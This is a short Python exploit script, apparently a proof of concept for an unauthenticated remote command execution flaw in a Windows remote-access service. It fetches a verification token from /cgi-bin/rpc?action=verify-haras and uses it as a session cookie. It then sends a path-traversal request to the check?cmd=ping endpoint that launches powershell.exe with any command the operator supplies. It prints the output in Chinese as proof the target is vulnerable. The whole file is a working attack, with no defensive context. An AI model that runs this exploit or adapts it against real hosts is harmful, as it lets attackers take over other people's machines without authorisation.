import requests
import urllib3
import re
import sys

urllib3.disable_warnings()

def pr(host,cmd):
    headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"}
    payload='/cgi-bin/rpc?action=verify-haras'
    payload1='/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+{}'.format(cmd)
    url=host
    try:
        response1=requests.get(url=url+payload,headers=headers1,verify=False,timeout=30)
        cookie=re.search(r'verify_string(.*?),',response1.text, re.S).group(1).replace('"','').replace(":","")
        cookie="CID={}".format(cookie)
        headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                   "Cookie": cookie}
        response=requests.get(url=url+payload1,headers=headers2,verify=False,timeout=30)
        if response.text != '':
            print(url+"漏洞存在，命令回显："+response.text)
        else:
            print(url + " 漏洞不存在")
    except Exception as e:
        print(url + " 异常")
if __name__ == '__main__':
    url = sys.argv[1]
    cmd = sys.argv[2]
    pr(url,cmd)
